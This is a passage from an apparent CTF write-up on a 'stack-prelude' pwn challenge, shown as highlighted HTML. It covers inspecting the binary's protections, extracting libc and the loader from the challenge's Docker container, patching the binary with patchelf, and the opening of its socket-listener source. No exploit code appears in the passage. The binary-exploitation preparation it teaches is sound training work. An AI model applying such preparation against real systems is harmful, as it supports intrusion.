style="--0:#005CC5;--1:#79B8FF">1</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">kali</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">kali</span><span style="--0:#24292E;--1:#E1E4E8">  </span><span style="--0:#005CC5;--1:#79B8FF">1236</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">Dec</span><span style="--0:#24292E;--1:#E1E4E8">  </span><span style="--0:#005CC5;--1:#79B8FF">1</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">14:57</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">main.c</span></div></div><div class="ec-line"><div class="code"><span style="--0:#6F42C1;--1:#B392F0">-rwxrw-rw-</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#005CC5;--1:#79B8FF">1</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">kali</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">kali</span><span style="--0:#24292E;--1:#E1E4E8">    </span><span style="--0:#005CC5;--1:#79B8FF">56</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">Dec</span><span style="--0:#24292E;--1:#E1E4E8">  </span><span style="--0:#005CC5;--1:#79B8FF">1</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">14:57</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">run</span></div></div></code></pre><div class="copy"><button title="Copy to clipboard" data-copied="Copied!" data-code="$ ls -latotal 44drwxrwxr-x 2 kali kali  4096 Dec  4 03:12 .drwxrwxr-x 5 kali kali  4096 Dec  4 03:11 ..-rwxrw-rw- 1 kali kali 16480 Dec  1 14:57 chall-rwxrw-rw- 1 kali kali   117 Dec  1 14:57 compose.yml-rwxrw-rw- 1 kali kali   293 Dec  1 14:57 Dockerfile-rwxrw-rw- 1 kali kali  1236 Dec  1 14:57 main.c-rwxrw-rw- 1 kali kali    56 Dec  1 14:57 run"><div></div></button></div></figure></div>
<p>The challenge binary is 64-bit, dynamically linked file with all protections enabled.</p>
<div class="expressive-code"><figure class="frame is-terminal"><figcaption class="header"><span class="title"></span><span class="sr-only">Terminal window</span></figcaption><pre data-language="bash" class="wrap" style="--ecMaxLine:55ch"><code><div class="ec-line"><div class="code"><span style="--0:#6F42C1;--1:#B392F0">$</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">file</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">chall</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#BF3441;--1:#F97583">|</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#6F42C1;--1:#B392F0">tr</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">&#39;,&#39;</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">&#39;\n&#39;</span></div></div><div class="ec-line"><div class="code"><span style="--0:#6F42C1;--1:#B392F0">chall:</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">ELF</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">64-bit</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">LSB</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">pie</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">executable</span></div></div><div class="ec-line" style="--ecIndent:1ch"><div class="code"><span class="indent"> </span><span style="--0:#6F42C1;--1:#B392F0">x86-64</span></div></div><div class="ec-line" style="--ecIndent:1ch"><div class="code"><span class="indent"> </span><span style="--0:#6F42C1;--1:#B392F0">version</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#005CC5;--1:#79B8FF">1</span><span style="--0:#24292E;--1:#E1E4E8"> (SYSV)</span></div></div><div class="ec-line" style="--ecIndent:1ch"><div class="code"><span class="indent"> </span><span style="--0:#6F42C1;--1:#B392F0">dynamically</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">linked</span></div></div><div class="ec-line" style="--ecIndent:1ch"><div class="code"><span class="indent"> </span><span style="--0:#6F42C1;--1:#B392F0">interpreter</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">/lib64/ld-linux-x86-64.so.2</span></div></div><div class="ec-line" style="--ecIndent:1ch"><div class="code"><span class="indent"><span style="--0:#24292E;--1:#E1E4E8"> </span></span><span style="--0:#24292E;--1:#E1E4E8">BuildID[sha1]</span><span style="--0:#BF3441;--1:#F97583">=</span><span style="--0:#032F62;--1:#9ECBFF">98066cd54d88d653787047257b5610474db51430</span></div></div><div class="ec-line" style="--ecIndent:1ch"><div class="code"><span class="indent"> </span><span style="--0:#BF3441;--1:#F97583">for</span><span style="--0:#24292E;--1:#E1E4E8"> GNU/Linux </span><span style="--0:#005CC5;--1:#79B8FF">3.2.0</span></div></div><div class="ec-line" style="--ecIndent:1ch"><div class="code"><span class="indent"> </span><span style="--0:#6F42C1;--1:#B392F0">not</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">stripped</span></div></div><div class="ec-line"><div class="code">
</div></div><div class="ec-line"><div class="code"><span style="--0:#6F42C1;--1:#B392F0">$</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">pwn</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">checksec</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">chall</span></div></div><div class="ec-line"><div class="code"><span style="--0:#24292E;--1:#E1E4E8">[</span><span style="--0:#BF3441;--1:#F97583">*</span><span style="--0:#24292E;--1:#E1E4E8">] </span><span style="--0:#032F62;--1:#9ECBFF">&#39;/home/kali/blackhat-finals/stack-prelude/chall&#39;</span></div></div><div class="ec-line" style="--ecIndent:4ch"><div class="code"><span class="indent">    </span><span style="--0:#6F42C1;--1:#B392F0">Arch:</span><span style="--0:#24292E;--1:#E1E4E8">       </span><span style="--0:#032F62;--1:#9ECBFF">amd64-64-little</span></div></div><div class="ec-line" style="--ecIndent:4ch"><div class="code"><span class="indent">    </span><span style="--0:#6F42C1;--1:#B392F0">RELRO:</span><span style="--0:#24292E;--1:#E1E4E8">      </span><span style="--0:#032F62;--1:#9ECBFF">Full</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">RELRO</span></div></div><div class="ec-line" style="--ecIndent:4ch"><div class="code"><span class="indent">    </span><span style="--0:#6F42C1;--1:#B392F0">Stack:</span><span style="--0:#24292E;--1:#E1E4E8">      </span><span style="--0:#032F62;--1:#9ECBFF">Canary</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">found</span></div></div><div class="ec-line" style="--ecIndent:4ch"><div class="code"><span class="indent">    </span><span style="--0:#6F42C1;--1:#B392F0">NX:</span><span style="--0:#24292E;--1:#E1E4E8">         </span><span style="--0:#032F62;--1:#9ECBFF">NX</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">enabled</span></div></div><div class="ec-line" style="--ecIndent:4ch"><div class="code"><span class="indent">    </span><span style="--0:#6F42C1;--1:#B392F0">PIE:</span><span style="--0:#24292E;--1:#E1E4E8">        </span><span style="--0:#032F62;--1:#9ECBFF">PIE</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">enabled</span></div></div><div class="ec-line" style="--ecIndent:4ch"><div class="code"><span class="indent">    </span><span style="--0:#6F42C1;--1:#B392F0">SHSTK:</span><span style="--0:#24292E;--1:#E1E4E8">      </span><span style="--0:#032F62;--1:#9ECBFF">Enabled</span></div></div><div class="ec-line" style="--ecIndent:4ch"><div class="code"><span class="indent">    </span><span style="--0:#6F42C1;--1:#B392F0">IBT:</span><span style="--0:#24292E;--1:#E1E4E8">        </span><span style="--0:#032F62;--1:#9ECBFF">Enabled</span></div></div><div class="ec-line" style="--ecIndent:4ch"><div class="code"><span class="indent">    </span><span style="--0:#6F42C1;--1:#B392F0">Stripped:</span><span style="--0:#24292E;--1:#E1E4E8">   </span><span style="--0:#032F62;--1:#9ECBFF">No</span></div></div></code></pre><div class="copy"><button title="Copy to clipboard" data-copied="Copied!" data-code="$ file chall | tr ',' '\n'chall: ELF 64-bit LSB pie executable x86-64 version 1 (SYSV) dynamically linked interpreter /lib64/ld-linux-x86-64.so.2 BuildID[sha1]=98066cd54d88d653787047257b5610474db51430 for GNU/Linux 3.2.0 not stripped$ pwn checksec chall[*] '/home/kali/blackhat-finals/stack-prelude/chall'    Arch:       amd64-64-little    RELRO:      Full RELRO    Stack:      Canary found    NX:         NX enabled    PIE:        PIE enabled    SHSTK:      Enabled    IBT:        Enabled    Stripped:   No"><div></div></button></div></figure></div>
<h3 id="patching-the-binary">Patching the binary</h3>
<p>The challenge files don’t include <code>libc.so.6</code>, but docker config files are provided. We can use these to spin up the container and extract the exact libc and loader (<code>ld-linux-x86-64.so.2</code>) used on the remote server, then patch our local binary with them.</p>
<div class="expressive-code"><figure class="frame is-terminal"><figcaption class="header"><span class="title"></span><span class="sr-only">Terminal window</span></figcaption><pre data-language="bash" class="wrap" style="--ecMaxLine:27ch"><code><div class="ec-line"><div class="code"><span style="--0:#6F42C1;--1:#B392F0">$</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">docker</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">compose</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">up</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#005CC5;--1:#79B8FF">--build</span></div></div></code></pre><div class="copy"><button title="Copy to clipboard" data-copied="Copied!" data-code="$ docker compose up --build"><div></div></button></div></figure></div>
<p><img src="/other-files/docker-compose.wf-LkkT8_8eY9W.webp" alt width="1900" height="622" loading="lazy" decoding="async"></p>
<p>In another terminal:</p>
<div class="expressive-code"><figure class="frame is-terminal"><figcaption class="header"><span class="title"></span><span class="sr-only">Terminal window</span></figcaption><pre data-language="bash" class="wrap" style="--ecMaxLine:185ch"><code><div class="ec-line"><div class="code"><span style="--0:#6F42C1;--1:#B392F0">$</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">docker</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">ps</span></div></div><div class="ec-line"><div class="code"><span style="--0:#6F42C1;--1:#B392F0">CONTAINER</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">ID</span><span style="--0:#24292E;--1:#E1E4E8">   </span><span style="--0:#032F62;--1:#9ECBFF">IMAGE</span><span style="--0:#24292E;--1:#E1E4E8">                              </span><span style="--0:#032F62;--1:#9ECBFF">COMMAND</span><span style="--0:#24292E;--1:#E1E4E8">                   </span><span style="--0:#032F62;--1:#9ECBFF">CREATED</span><span style="--0:#24292E;--1:#E1E4E8">         </span><span style="--0:#032F62;--1:#9ECBFF">STATUS</span><span style="--0:#24292E;--1:#E1E4E8">         </span><span style="--0:#032F62;--1:#9ECBFF">PORTS</span><span style="--0:#24292E;--1:#E1E4E8">                                       </span><span style="--0:#032F62;--1:#9ECBFF">NAMES</span></div></div><div class="ec-line"><div class="code"><span style="--0:#6F42C1;--1:#B392F0">da326410cdea</span><span style="--0:#24292E;--1:#E1E4E8">   </span><span style="--0:#032F62;--1:#9ECBFF">stack-prelude-stack-prelude-dist</span><span style="--0:#24292E;--1:#E1E4E8">   </span><span style="--0:#032F62;--1:#9ECBFF">&quot;/bin/sh -c </span><span style="--0:#005CC5;--1:#79B8FF">\&quot;</span><span style="--0:#032F62;--1:#9ECBFF">/app/ru…&quot;</span><span style="--0:#24292E;--1:#E1E4E8">   </span><span style="--0:#005CC5;--1:#79B8FF">6</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">seconds</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">ago</span><span style="--0:#24292E;--1:#E1E4E8">   </span><span style="--0:#032F62;--1:#9ECBFF">Up</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#005CC5;--1:#79B8FF">3</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">seconds</span><span style="--0:#24292E;--1:#E1E4E8">   </span><span style="--0:#032F62;--1:#9ECBFF">0.0.0.0:5000</span><span style="--0:#24292E;--1:#E1E4E8">-</span><span style="--0:#BF3441;--1:#F97583">&gt;</span><span style="--0:#032F62;--1:#9ECBFF">5000/tcp,</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">:::5000</span><span style="--0:#24292E;--1:#E1E4E8">-</span><span style="--0:#BF3441;--1:#F97583">&gt;</span><span style="--0:#032F62;--1:#9ECBFF">5000/tcp</span><span style="--0:#24292E;--1:#E1E4E8">   </span><span style="--0:#032F62;--1:#9ECBFF">stack-prelude-stack-prelude-dist-1</span></div></div><div class="ec-line"><div class="code">
</div></div><div class="ec-line"><div class="code"><span style="--0:#6F42C1;--1:#B392F0">$</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">docker</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">cp</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">da326410cdea:/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">ld-linux-x86-64.so.2</span></div></div><div class="ec-line"><div class="code"><span style="--0:#6F42C1;--1:#B392F0">Successfully</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">copied</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">239kB</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">to</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">/home/kali/blackhat-finals/stack-prelude/ld-linux-x86-64.so.2</span></div></div><div class="ec-line"><div class="code">
</div></div><div class="ec-line"><div class="code"><span style="--0:#6F42C1;--1:#B392F0">$</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">docker</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">cp</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">da326410cdea:/lib/x86_64-linux-gnu/libc.so.6</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">libc.so.6</span></div></div><div class="ec-line"><div class="code"><span style="--0:#6F42C1;--1:#B392F0">Successfully</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">copied</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">2.13MB</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">to</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">/home/kali/blackhat-finals/stack-prelude/libc.so.6</span></div></div></code></pre><div class="copy"><button title="Copy to clipboard" data-copied="Copied!" data-code="$ docker psCONTAINER ID   IMAGE                              COMMAND                   CREATED         STATUS         PORTS                                       NAMESda326410cdea   stack-prelude-stack-prelude-dist   &#34;/bin/sh -c \&#34;/app/ru…&#34;   6 seconds ago   Up 3 seconds   0.0.0.0:5000->5000/tcp, :::5000->5000/tcp   stack-prelude-stack-prelude-dist-1$ docker cp da326410cdea:/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2 ld-linux-x86-64.so.2Successfully copied 239kB to /home/kali/blackhat-finals/stack-prelude/ld-linux-x86-64.so.2$ docker cp da326410cdea:/lib/x86_64-linux-gnu/libc.so.6 libc.so.6Successfully copied 2.13MB to /home/kali/blackhat-finals/stack-prelude/libc.so.6"><div></div></button></div></figure></div>
<p>Now that we have all the files we need we can patch the binary to use the libc and ld we just copied from the docker.</p>
<div class="expressive-code"><figure class="frame is-terminal"><figcaption class="header"><span class="title"></span><span class="sr-only">Terminal window</span></figcaption><pre data-language="bash" class="wrap" style="--ecMaxLine:82ch"><code><div class="ec-line"><div class="code"><span style="--0:#6F42C1;--1:#B392F0">$</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">patchelf</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#005CC5;--1:#79B8FF">--set-interpreter</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">./ld-linux-x86-64.so.2</span><span style="--0:#24292E;--1:#E1E4E8">  </span><span style="--0:#005CC5;--1:#79B8FF">--set-rpath</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">.</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">./chall</span></div></div><div class="ec-line"><div class="code"><span style="--0:#6F42C1;--1:#B392F0">$</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">ldd</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">./chall</span></div></div><div class="ec-line" style="--ecIndent:8ch"><div class="code"><span class="indent">        </span><span style="--0:#6F42C1;--1:#B392F0">linux-vdso.so.1</span><span style="--0:#24292E;--1:#E1E4E8"> (0x00007f1ffd418000)</span></div></div><div class="ec-line" style="--ecIndent:8ch"><div class="code"><span class="indent">        </span><span style="--0:#6F42C1;--1:#B392F0">libc.so.6</span><span style="--0:#24292E;--1:#E1E4E8"> =</span><span style="--0:#BF3441;--1:#F97583">&gt;</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">./libc.so.6</span><span style="--0:#24292E;--1:#E1E4E8"> (0x00007f1ffd000000)</span></div></div><div class="ec-line" style="--ecIndent:8ch"><div class="code"><span class="indent">        </span><span style="--0:#6F42C1;--1:#B392F0">./ld-linux-x86-64.so.2</span><span style="--0:#24292E;--1:#E1E4E8"> =</span><span style="--0:#BF3441;--1:#F97583">&gt;</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">/lib64/ld-linux-x86-64.so.2</span><span style="--0:#24292E;--1:#E1E4E8"> (0x00007f1ffd41a000)</span></div></div></code></pre><div class="copy"><button title="Copy to clipboard" data-copied="Copied!" data-code="$ patchelf --set-interpreter ./ld-linux-x86-64.so.2  --set-rpath . ./chall$ ldd ./chall        linux-vdso.so.1 (0x00007f1ffd418000)        libc.so.6 => ./libc.so.6 (0x00007f1ffd000000)        ./ld-linux-x86-64.so.2 => /lib64/ld-linux-x86-64.so.2 (0x00007f1ffd41a000)"><div></div></button></div></figure></div>
<h3 id="examining-the-source-code">Examining the source code</h3>
<p>Looking at the <code>main.c</code> file we can see that <code>main()</code> setups a listner on port <code>31337</code>/<code>argv[1]</code> and after the first connection enters into a <code>while</code> loop.</p>
<div class="expressive-code"><figure class="frame"><figcaption class="header"></figcaption><pre data-language="c" class="wrap" style="--ecMaxLine:73ch"><code><div class="ec-section collapsible-start"><details><summary><div class="ec-line"><div class="gutter"><div class="ln"></div></div><div class="code"><span class="expand"></span><span class="collapse"></span><span class="text">8 collapsed lines</span></div></div></summary></details><div class="content-lines"><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">1</div></div><div class="code"><span style="--0:#BF3441;--1:#F97583">#define</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#6F42C1;--1:#B392F0">_GNU_SOURCE</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">2</div></div><div class="code"><span style="--0:#BF3441;--1:#F97583">#include</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">&lt;stdio.h&gt;</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">3</div></div><div class="code"><span style="--0:#BF3441;--1:#F97583">#include</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">&lt;stdlib.h&gt;</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">4</div></div><div class="code"><span style="--0:#BF3441;--1:#F97583">#include</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">&lt;netinet/in.h&gt;</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">5</div></div><div class="code"><span style="--0:#BF3441;--1:#F97583">#include</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">&lt;sys/socket.h&gt;</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">6</div></div><div class="code"><span style="--0:#BF3441;--1:#F97583">#include</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">&lt;sys/types.h&gt;</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">7</div></div><div class="code"><span style="--0:#BF3441;--1:#F97583">#include</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">&lt;unistd.h&gt;</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">8</div></div><div class="code">
</div></div></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">9</div></div><div class="code"><span style="--0:#BF3441;--1:#F97583">int</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#6F42C1;--1:#B392F0">main</span><span style="--0:#24292E;--1:#E1E4E8">(</span><span style="--0:#BF3441;--1:#F97583">int</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#AE4B07;--1:#FFAB70">argc</span><span style="--0:#24292E;--1:#E1E4E8">, </span><span style="--0:#BF3441;--1:#F97583">char</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#BF3441;--1:#F97583">**</span><span style="--0:#AE4B07;--1:#FFAB70">argv</span><span style="--0:#24292E;--1:#E1E4E8">) {</span></div></div><div class="ec-line" style="--ecIndent:2ch"><div class="gutter"><div class="ln" aria-hidden="true">10</div></div><div class="code"><span class="indent">  </span><span style="--0:#BF3441;--1:#F97583">struct</span><span style="--0:#24292E;--1:#E1E4E8"> sockaddr_in cli, addr </span><span style="--0:#BF3441;--1:#F97583">=</span><span style="--0:#24292E;--1:#E1E4E8"> {</span><span style="--0:#005CC5;--1:#79B8FF">0</span><span style="--0:#24292E;--1:#E1E4E8">};</span></div></div><div class="ec-line" style="--ecIndent:2ch"><div class="gutter"><div class="ln" aria-hidden="true">11</div></div><div class="code"><span class="indent">  </span><span style="--0:#005CC5;--1:#79B8FF">socklen_t</span><span style="--0:#24292E;--1:#E1E4E8"> clen;</span></div></div><div class="ec-line" style="--ecIndent:2ch"><div class="gutter"><div class="ln" aria-hidden="true">12</div></div><div class="code"><span class="indent">  </span><span style="--0:#BF3441;--1:#F97583">int</span><span style="--0:#24292E;--1:#E1E4E8"> cfd, sfd </span><span style="--0:#BF3441;--1:#F97583">=</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#BF3441;--1:#F97583">-</span><span style="--0:#005CC5;--1:#79B8FF">1</span><span style="--0:#24292E;--1:#E1E4E8">, yes </span><span style="--0:#BF3441;--1:#F97583">=</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#005CC5;--1:#79B8FF">1</span><span style="--0:#24292E;--1:#E1E4E8">;</span></div></div><div class="ec-line" style="--ecIndent:2ch"><div class="gutter"><div class="ln" aria-hidden="true">13</div></div><div class="code"><span class="indent">  </span><span style="--0:#BF3441;--1:#F97583">ssize_t</span><span style="--0:#24292E;--1:#E1E4E8"> n;</span></div></div><div class="ec-line" style="--ecIndent:2ch"><div class="gutter"><div class="ln" aria-hidden="true">14</div></div><div class="code"><span class="indent">  </span><span style="--0:#BF3441;--1:#F97583">char</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#AE4B07;--1:#FFAB70">buf</span><span style="--0:#24292E;--1:#E1E4E8">[</span><span style="--0:#BF3441;--1:#F97583">0x</span><span style="--0:#005CC5;--1:#79B8FF">100</span><span style="--0:#24292E;--1:#E1E4E8">];</span></div></div><div class="ec-line" style="--ecIndent:2ch"><div class="gutter"><div class="ln" aria-hidden="true">15</div></div><div class="code"><span class="indent">  </span><span style="--0:#BF3441;--1:#F97583">unsigned</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#BF3441;--1:#F97583">short</span><span style="--0:#24292E;--1:#E1E4E8"> port </span><span style="--0:#BF3441;--1:#F97583">=</span><span style="--0:#24292E;--1:#E1E4E8"> argc </span><span style="--0:#BF3441;--1:#F97583">&lt;</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#005CC5;--1:#79B8FF">2</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#BF3441;--1:#F97583">?</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#005CC5;--1:#79B8FF">31337</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#BF3441;--1:#F97583">:</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#6F42C1;--1:#B392F0">atoi</span><span style="--0:#24292E;--1:#E1E4E8">(</span><span style="--0:#AE4B07;--1:#FFAB70">argv</span><span style="--0:#24292E;--1:#E1E4E8">[</span><span style="--0:#005CC5;--1:#79B8FF">1</span><span style="--0:#24292E;--1:#E1E4E8">]);</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">16</div></div><div class="code">
</div></div><div class="ec-line" style="--ecIndent:2ch"><div class="gutter"><div class="ln" aria-hidden="true">17</div></div><div class="code"><span class="indent">  </span><span style="--0:#616972;--1:#99A0A6">// listner setup</span></div></div><div class="ec-section collapsible-start"><details><summary><div class="ec-line" style="--ecIndent:2ch"><div class="gutter"><div class="ln"></div></div><div class="code"><span class="expand"></span><span class="collapse"></span><span class="text">24 collapsed lines</span></div></div></summary></details><div class="content-lines"><div class="ec-line" style="--ecIndent:2ch"><div class="gutter"><div class="ln" aria-hidden="true">18</div></div><div class="code"><span class="indent">  </span><span style="--0:#BF3441;--1:#F97583">if</span><span style="--0:#24292E;--1:#E1E4E8"> ((sfd </span><span style="--0:#BF3441;--1:#F97583">=</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#6F42C1;--1:#B392F0">socket</span><span style="--0:#24292E;--1:#E1E4E8">(AF_INET, SOCK_STREAM, </span><span style="--0:#005CC5;--1:#79B8FF">0</span><span style="--0:#24292E;--1:#E1E4E8">)) </span><span style="--0:#BF3441;--1:#F97583">&lt;</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#005CC5;--1:#79B8FF">0</span><span style="--0:#24292E;--1:#E1E4E8">) {</span></div></div><div class="ec-line" style="--ecIndent:4ch"><div class="gutter"><div class="ln" aria-hidden="true">19</div></div><div class="code"><span class="indent">    </span><span style="--0:#6F42C1;--1:#B392F0">perror</span><span style="--0:#24292E;--1:#E1E4E8">(</span><span style="--0:#032F62;--1:#9ECBFF">&quot;socket&quot;</span><span style="--0:#24292E;--1:#E1E4E8">);</span></div></div><div class="ec-line" style="--ecIndent:4ch"><div class="gutter"><div class="ln" aria-hidden="true">20</div></div><div class="code"><span class="indent">    </span><span style="--0:#BF3441;--1:#F97583">goto</span><span style="--0:#24292E;--1:#E1E4E8"> err;</span></div></div><div class="ec-line" style="--ecIndent:2ch"><div class="gutter"><div class="ln" aria-hidden="true">21</div></div><div class="code"><span class="indent"><span style="--0:#24292E;--1:#E1E4E8">  </span></span><span style="--0:#24292E;--1:#E1E4E8">}</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">22</div></div><div class="code">
